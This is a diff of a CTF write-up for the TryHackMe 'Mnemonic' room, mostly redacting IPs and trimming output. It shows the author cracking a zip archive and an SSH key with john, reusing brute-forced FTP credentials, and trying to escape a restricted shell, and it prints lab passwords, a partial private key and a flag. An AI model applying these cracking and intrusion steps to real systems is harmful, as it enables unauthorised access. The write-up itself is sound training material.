@@ -1,14 +1,20 @@
-May 10, 2025<br>
-Day 370<br>
+<p align="center">May 11, 2025<br>
+Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
+It´s part of my $$\textcolor{#FF69B4}{\textbf{370}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
+<img width="300px" src="" alt="Your Image Badge"><br>
+<img width="200px" src="https://github.com/user-attachments/assets/62cf4572-71af-43ed-898e-31c0887632ce" alt="Your Image Badge"></p>
+<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Mnemonic}}$$</h1>
+<p align="center"><em>I hope you have fun.</em>.<br>
+It is classified as a mediumlevel CTF.<br>
+You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed.<br>
+Can be accessed clicking  <a href="https://tryhackme.com/room/mnemonic</a>.</p>
 
-![image](https://github.com/user-attachments/assets/62cf4572-71af-43ed-898e-31c0887632ce)
+<p align="center"> <img width="1000px" src=""> </p>
 
-<h1>Mnemonic</h1>
-
-https://tryhackme.com/room/mnemonic<br>
 
 <br>
 <br>
+
 
 ![image](https://github.com/user-attachments/assets/b3d9f441-f92c-4d5c-b68e-2d5d25456004)
 
@@ -70,6 +76,7 @@ PORT     STATE SERVICE VERSION
 > 2.3. <em>what is the name of the secret file?</em><a id='2.3'></a>
 >> <code><strong>backups.zip</strong></code><br>
 
+<br>
 <br>
 
 
@@ -270,6 +277,12 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-10 03:05:
 <br>
 <br>
 
+> 3.5. <em>What is the condor password?</em><a id='3.4'></a>
+>> <code><strong>pasificbell1981</strong></code><br>
+
+<br>
+<br>
+
 
 <h3 align="center">$$\textcolor{white}{\textnormal{ftp --> ftpuser : love4ever}}$$</h3>
 <p align="center"><code>ftpuser</code> : <code>love4ever</code></p>
@@ -331,34 +344,19 @@ local: id_rsa remote: id_rsa
 226 Transfer complete.
 1766 bytes received in 0.00 secs (2.1211 MB/s)
 ftp> exit
-
 ...
-
-root@ip-10-10-26-50:~/Mnemonic# cat not.txt
+:~/Mnemonic# cat not.txt
 james change ftp user password
-root@ip-10-10-26-50:~/Mnemonic# chmod +x id_rsa
-root@ip-10-10-26-50:~/Mnemonic# ls
+:~/Mnemonic# ls
 backups.zip  id_rsa  not.txt
-root@ip-10-10-26-50:~/Mnemonic# ssh -p 1337 -i id_rsa james@10.10.229.90
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-Permissions 0755 for 'id_rsa' are too open.
-It is required that your private key files are NOT accessible by others.
-This private key will be ignored.
-Load key "id_rsa": bad permissions
-james@10.10.229.90's password:
-
-...
-
 :~/Mnemonic# locate ssh2john
 /opt/john/ssh2john.py
-root@ip-10-10-26-50:~/Mnemonic# python2 /opt/john/ssh2john.py id_rsa > hash
-root@ip-10-10-26-50:~/Mnemonic# ls
+:~/Mnemonic# python2 /opt/john/ssh2john.py id_rsa > hash
+:~/Mnemonic# ls
 backups.zip  hash  id_rsa  not.txt
-root@ip-10-10-26-50:~/Mnemonic# john --worddlist=/usr/share/wordlists/rockyou.txt hash
+:~/Mnemonic# john --worddlist=/usr/share/wordlists/rockyou.txt hash
 Unknown option: "--worddlist=/usr/share/wordlists/rockyou.txt"
-root@ip-10-10-26-50:~/Mnemonic# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+:~/Mnemonic# john --wordlist=/usr/share/wordlists/rockyou.txt hash
 Note: This format may emit false positives, so it will keep trying even after finding a
 possible candidate.
 Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
@@ -372,34 +370,16 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 bluelove         (id_rsa)
 1g 0:00:00:10 DONE (2025-05-10 23:11) 0.09842g/s 1411Kp/s 1411Kc/s 1411KC/s *7¡Vamos!
 Session completed. 
-root@ip-10-10-26-50:~/Mnemonic# 
-
+:~/Mnemonic# 
 ...
-
-:~/Mnemonic# ssh -p 1337 james@10.10.229.90
+:~/Mnemonic# chmod 600 id_rsa
+:~/Mnemonic# ssh -p 1337 james@TargetIP
 james@10.10.229.90's password: 
-Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Sat May 10 22:17:53 UTC 2025
-
-  System load:  0.08               Processes:           94
-  Usage of /:   34.0% of 12.01GB   Users logged in:     0
-  Memory usage: 16%                IP address for eth0: 10.10.229.90
-  Swap usage:   0%
-
+...
   => There is 1 zombie process.
-
-
 51 packages can be updated.
 0 updates are security updates.
-
-
-Last login: Thu Jul 23 20:40:09 2020 from 192.168.1.5
-
+...
 james@mnemonic:~$ pwd
 /home/james
 james@mnemonic:~$ ls -la
@@ -472,9 +452,6 @@ drwxrwxr-x  3 james james 4096 Jul 13  2020 .local
 -rw-r--r--  1 james james  807 Jul 13  2020 .profile
 drwx------  2 james james 4096 Jul 13  2020 .ssh
 james@mnemonic:~$ 
-
-
-
 ```
 
 <br>
@@ -483,8 +460,8 @@ james@mnemonic:~$
 
 
 ```bash
-root@ip-10-10-108-227:~# ssh james@10.10.2.180
-ssh: connect to host 10.10.2.180 port 22: Connection refused
+:~# ssh james@TargetIP
+...
 root@ip-10-10-108-227:~# gobuster dir -u http://10.10.2.180/webmasters/backups/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,html,zip,tar,gz,back.old,js,txt
 ===============================================================
 Gobuster v3.6
@@ -536,75 +513,35 @@ Progress: 41526 / 41535 (99.98%)
 ===============================================================
 Finished
 ===============================================================
-^Xroot@ip-10-10-108-227:~# ^C
-root@ip-10-10-108-227:~# file backups.zip
+:~# file backups.zip
 backups.zip: Zip archive data, at least v1.0 to extract
-root@ip-10-10-108-227:~# zip2john backups.zip > hash
+:~# zip2john backups.zip > hash
 ver 1.0 backups.zip/backups/ is not encrypted, or stored with non-handled compression type
 ver 2.0 efh 5455 efh 7875 backups.zip/backups/note.txt PKZIP Encr: 2b chk, TS_chk, cmplen=67, decmplen=60, crc=AEE718A8 type=8
-root@ip-10-10-108-227:~# ls
+:~# ls
 '=2.5,!=2.5.0,!=2.5.2,!=2.6'   Desktop        Pictures   snap
  backups.zip                   Downloads      Postman    thinclient_drives
  burp.json                     hash           Rooms      Tools
  CTFBuilder                    Instructions   Scripts
-root@ip-10-10-108-227:~# cat hash
+:~# cat hash
 backups.zip/backups/note.txt:$pkzip2$1*2*2*0*43*3c*aee718a8*42*4a*8*43*aee7*24e2*2918f93964f9ffa39d4a5fc0d589cae4222fd228a12bc6459bf7b383bdc3cd74557af7a16783ba3217388d2db639162dcee0456f5264bb1839b0f63a28de19581bda79*$/pkzip2$:backups/note.txt:backups.zip::backups.zip
-root@ip-10-10-108-227:~# cat note.txt
+:~# cat note.txt
 cat: note.txt: No such file or directory
-root@ip-10-10-108-227:~# unzip backups.zip
+:~# unzip backups.zip
 Archive:  backups.zip
    creating: backups/
 [backups.zip] backups/note.txt password: 
   inflating: backups/note.txt        
-root@ip-10-10-108-227:~# cat note;txt
-cat: note: No such file or directory
-ls
-
-Command 'txt' not found, did you mean:
-
-  command 'xt' from snap xt (0+git.99c6ce0)
-  command 'tgt' from deb tcm (2.20+TSQD-5build1)
-  command 'tx' from deb transifex-client (0.13.5-2)
-  command 'tst' from deb pvm-examples (3.4.6-2build2)
-  command 'tt' from deb treetop (1.6.8-1)
-  command 'ttx' from deb fonttools (4.5.0-1)
-
-See 'snap info <snapname>' for additional versions.
-
-root@ip-10-10-108-227:~# ls
-'=2.5,!=2.5.0,!=2.5.2,!=2.6'   CTFBuilder   Instructions   Scripts
- backups                       Desktop      Pictures       snap
- backups.zip                   Downloads    Postman        thinclient_drives
- burp.json                     hash         Rooms          Tools
-root@ip-10-10-108-227:~# cd bckups
-bash: cd: bckups: No such file or directory
-root@ip-10-10-108-227:~# ls
-'=2.5,!=2.5.0,!=2.5.2,!=2.6'   CTFBuilder   Instructions   Scripts
- backups                       Desktop      Pictures       snap
- backups.zip                   Downloads    Postman        thinclient_drives
- burp.json                     hash         Rooms          Tools
-root@ip-10-10-108-227:~# cd backups
-root@ip-10-10-108-227:~/backups# ls[
-> ^C
-root@ip-10-10-108-227:~/backups# ls
+:~# cd backups
+:~/backups# ls
 note.txt
-root@ip-10-10-108-227:~/backups# cat note.txt
+:~/backups# cat note.txt
 @vill
 
 James new ftp username: ftpuser
 we have to work hard
-root@ip-10-10-108-227:~/backups# ftp 10.10.2.18
-ftpuserftp: connect: No route to host
-ftp> ftpuser
-?Invalid command
-ftp> love4ever
-?Invalid command
-ftp> exit
-root@ip-10-10-108-227:~/backups# ftp 10.10.2.18
-ftp: connect: No route to host
-ftp> exit
-root@ip-10-10-108-227:~/backups# ftp 10.10.2.180
-Connected to 10.10.2.180.
+:~/backups# ftp TargetIP
+...
 220 (vsFTPd 3.0.3)
 Name (10.10.2.180:root): ftpuser
 331 Please specify the password.
@@ -660,17 +597,7 @@ DEK-Info: AES-128-CBC,01762A15A5B935E96A1CF34704C79AC3
 pSxCqzRmFf4dcfdkVay0+fN88/GXwl3LXOS1WQrRV26wqXTE1+EaL5LrRtET8mPM
 dkScGB/cHICB0cPvn3WU8ptdYCk78w9X9wHpPBa6VLk1eRi7MANLcfRWxQ4GFwXp
 CP8KSSZBCduabfcx6eLBBM8fMC+P2kgtIOhnlpt/sAU2zDQa8kZHw8V76pzcBLka
-trq4ik4tpsgHqEU4BDw24bNjtJxgEy4sddtpXyy0i3KZ9gm6Uop6/jFG8uuoAQPn
-AcwIZSCpjEfiMLzerVNNotZU9I11jRtbdQsxAjLPYY30PyO2cFlgpohvpyMD6lfO
-33v8DOV8U69zlyUtUgArfZ9IORPKLOW5VLfuqX8yLsylVrmmuGdlfN+zO5enukjV
-cg/mpJL/kePgViEqnTJf5Y8vYJ9tEGko8YBvorrsS0QXN7GJtW8h7IYrsLpXYzeu
-FPD5cgEdixE4UlGo7G6nmlkikLsDwjjVIDX9C3eHljAhiktKAu19wbwdaJ8F4WWW
-txZv/fsKBSI/JexzOY2lKSFq52Dod6G1eCVf0WgsQrXBOxgKn/iQ0dg4aCVNttni
-kKKW3hEQP3gK6B20dnIItFzQpaqapuNJKnAWEj6YG+7QpCjncMEMUDGpCSqnMuYB
-PVM3GU4sq5OO14gXtjOgTfBXP07cqkuW6L8XQl+sWobgVuIGmK69wfCZSjy29Hqo
-8SmeUAdiv37UenHGLxwjelnNcblLm/BYyW6P6m6pc+zgUSK/MVysGj9B8ryLVcIc
-P8O/HKResEUC/MZJGYWIZeu7UK/Ifs5IN/uTYmBM9/44tRJApvY+3rrdUUA3khjY
-ZTzeX1/xS5rqprEYcr19ExboGVqNCUMHPwmufZZbB1uUagaR2Cv44j9rU19BVF1s
+...
 czMMNJGJSoeA4UKNIuXFVIMbMcZD2fCKaKYWT6C0RDS0TrAf7AUurgHReAqsQhTE
 xxaGq7DLLflzVHC7EY2VhdAWmbNbGQi/k7+4wC6HTRbnLMh2kTFYMbGA64hDHxFP
 DYJh4ZCEDiyWe1JkmaeAAyc2n0TCVsgEzxgGPGe3tZynVML/rFWDMA0B5kZ9VLS7
@@ -683,42 +610,22 @@ weJKZAn1ib9/mG+PcdcPLFTcWIbXvigSx22svaiuG9WbVzU7GolkStYnrTPdDJ8M
 Nw6TzknzJ6s79cg6cKPefrQVFXYXYxSZOvK/TElYrirHqBacVwIyMxCbOgoUbsF2
 ipwD46fpPTKgP6qwDirNcKtULMtEud/rbqVvnP+fqm5UC+oqoX+lb1g2fvytTXSe
 -----END RSA PRIVATE KEY-----
-root@ip-10-10-108-227:~/backups# chmod 600 id_rsa
-root@ip-10-10-108-227:~/backups# ssh2john id_rsa > hash
-ssh2john: command not found
-root@ip-10-10-108-227:~/backups# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+:~/backups# chmod 600 id_rsa
+:~/backups# john --wordlist=/usr/share/wordlists/rockyou.txt hash
 Using default input encoding: UTF-8
 No password hashes loaded (see FAQ)
 root@ip-10-10-108-227:~/backups# ls
 hash  id_rsa  note.txt  not.txt
-root@ip-10-10-108-227:~/backups# ssh -i id_rsa james@10.10.2.180 -p 1337
-The authenticity of host '[10.10.2.180]:1337 ([10.10.2.180]:1337)' can't be established.
-ECDSA key fingerprint is SHA256:nwJynJn7/m7+VP5h40EAKHef3qSEfKTIZsdI8GH+LgI.
+:~/backups# ssh -i id_rsa james@TargetIP -p 1337
+...
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '[10.10.2.180]:1337' (ECDSA) to the list of known hosts.
 Enter passphrase for key 'id_rsa': 
 james@10.10.2.180's password: 
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Sun May 11 15:54:11 UTC 2025
-
-  System load:  0.0                Processes:           95
-  Usage of /:   34.1% of 12.01GB   Users logged in:     0
-  Memory usage: 17%                IP address for eth0: 10.10.2.180
-  Swap usage:   0%
-
+...
   => There is 1 zombie process.
-
-
-51 packages can be updated.
-0 updates are security updates.
-
-
-Last login: Thu Jul 23 20:40:09 2020 from 192.168.1.5
+...
 james@mnemonic:~$ cat noteforjames.txt
 noteforjames.txt
 
@@ -747,20 +654,12 @@ Broadcast message from root@mnemonic (somewhere) (Sun May 11 15:54:28 2025):
                                                                                
 which $SHELL
 /bin/rbash
+james@mnemonic:~$ which python3
+/usr/bin/python3
 james@mnemonic:~$ python3 -c "import pty;pty.spawn('bin/bash')"
 Traceback (most recent call last):
   File "<string>", line 1, in <module>
-  File "/usr/lib/python3.6/pty.py", line 156, in spawn
-    os.execlp(argv[0], *argv)
-  File "/usr/lib/python3.6/os.py", line 542, in execlp
-    execvp(file, args)
-  File "/usr/lib/python3.6/os.py", line 559, in execvp
-    _execvpe(file, args)
-  File "/usr/lib/python3.6/os.py", line 583, in _execvpe
-    exec_func(file, *argrest)
-FileNotFoundError: [Errno 2] No such file or directory
-james@mnemonic:~$ which python3
-/usr/bin/python3
+ ...
 james@mnemonic:~$ ls -lah
 total 44K
 drwx------  6 james james 4.0K Jul 14  2020 .
@@ -831,79 +730,20 @@ d????????? ? ? ? ?            ? ''\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTc
 Broadcast message from root@mnemonic (somewhere) (Sun May 11 15:56:58 2025):   
                                                                                
 System Blocking is Starting ...
-                                                                               
-                                                                               
-Broadcast message from root@mnemonic (somewhere) (Sun May 11 15:57:03 2025):   
-                                                                               
-10
-                                                                               
-                                                                               
-Broadcast message from root@mnemonic (somewhere) (Sun May 11 15:57:08 2025):   
-                                                                               
-9
-                                                                               
-                                                                               
-Broadcast message from root@mnemonic (somewhere) (Sun May 11 15:57:10 2025):   
-                                                                               
-8
-                                                                               
-                                                                               
-Broadcast message from root@mnemonic (somewhere) (Sun May 11 15:57:15 2025):   
-                                                                               
-7
-                                                                               
-                                                                               
-Broadcast message from root@mnemonic (somewhere) (Sun May 11 15:57:20 2025):   
-                                                                               
-6
-                                                                               
-                                                                               
-Broadcast message from root@mnemonic (somewhere) (Sun May 11 15:57:22 2025):   
-                                                                               
-5
-                                                                               
-                                                                               
-Broadcast message from root@mnemonic (somewhere) (Sun May 11 15:57:23 2025):   
-                                                                               
-4
-                                                                               
-                                                                               
-Broadcast message from root@mnemonic (somewhere) (Sun May 11 15:57:24 2025):   
-                                                                               
-3
-                                                                               
-                                                                               
-Broadcast message from root@mnemonic (somewhere) (Sun May 11 15:57:25 2025):   
-                                                                               
-2
-                                                                               
-                                                                               
-Broadcast message from root@mnemonic (somewhere) (Sun May 11 15:57:26 2025):   
-                                                                               
-1
-                                                                               
-                                                                               
-Broadcast message from root@mnemonic (somewhere) (Sun May 11 15:57:27 2025):   
-                                                                               
-0
-                                                                               
-                                                                               
-Broadcast message from root@mnemonic (somewhere) (Sun May 11 15:57:28 2025):   
-                                                                               
+...                                                                                  
 bybye!!!
-                                                                               
-Connection to 10.10.2.180 closed.
-root@ip-10-10-108-227:~/backups#
-
+...                                                       
+Connection to TargetIP closed.
+:~/backups#
 ```
 
 <br>
 
 ```bash
-
-root@ip-10-10-108-227:~# echo "aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==" | base64 -d
-https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpgroot@ip-10-10-108-227:~# echo "VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ==" | base64 -d 
-THM{a5f82a00e2feee3465249b855be71c01}root@ip-10-10-108-227:~# 
+:~# echo "aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==" | base64 -d
+https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jp
+:~# echo "VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ==" | base64 -d 
+THM{a5f82a00e2feee3465249b855be71c01}
 ```
 
 
@@ -919,18 +759,12 @@ THM{a5f82a00e2feee3465249b855be71c01}root@ip-10-10-108-227:~#
 ```bash
 
 ~# wget https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg
---2025-05-11 17:03:51--  https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg
-Resolving i.ytimg.com (i.ytimg.com)... 209.85.202.119, 209.85.203.119, 74.125.193.119, ...
-Connecting to i.ytimg.com (i.ytimg.com)|209.85.202.119|:443... connected.
-HTTP request sent, awaiting response... 200 OK
+...
 Length: 154514 (151K) [image/jpeg]
 Saving to: \u2018maxresdefault.jpg\u2019
 
-maxresdefault.jpg                          100%[=====================================================================================>] 150.89K  --.-KB/s    in 0.003s  
-
-2025-05-11 17:03:51 (42.3 MB/s) - \u2018maxresdefault.jpg\u2019 saved [154514/154514]
-
-root@ip-10-10-108-227:~# exiftool maxresdefault.jpg
+maxresdefault.jpg                          100%[=====================================================================================>] ...
+:~# exiftool maxresdefault.jpg
 ExifTool Version Number         : 11.88
 File Name                       : maxresdefault.jpg
 Directory                       : .
@@ -954,8 +788,7 @@ Color Components                : 3
 Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
 Image Size                      : 1280x720
 Megapixels                      : 0.922
-root@ip-10-10-108-227:~# 
-
+:~# 
 ```
 
 <br>
@@ -976,19 +809,6 @@ root@ip-10-10-108-227:~#
 <br>
 
 
-<br>
-
-```bash
-:~# apt install eog
-...
-:~# eog maxresdefault.jpg
-
-```
-
-<br>
-
-
-
 ![image](https://github.com/user-attachments/assets/717fc34a-47e9-4ad0-83ba-9d842bdd1cc4)
 
 
@@ -1000,7 +820,6 @@ root@ip-10-10-108-227:~#
 
 ![image](https://github.com/user-attachments/assets/4c41bff9-9f0b-413f-899c-8fc9bc99bf2d)
 
-<br>
 <br>
 
 ```bash
@@ -1063,7 +882,7 @@ PRESS TO QU\u0130T 'ENTER' OR 'E' PRESS TO CONT\u0130NUE.
 
 <br>
 
-<p>To learn ...</p>
+<p>Used sshpass this time to learn.</p>
 
 ```bash
 :~/Mnemonic# apt install sshpass
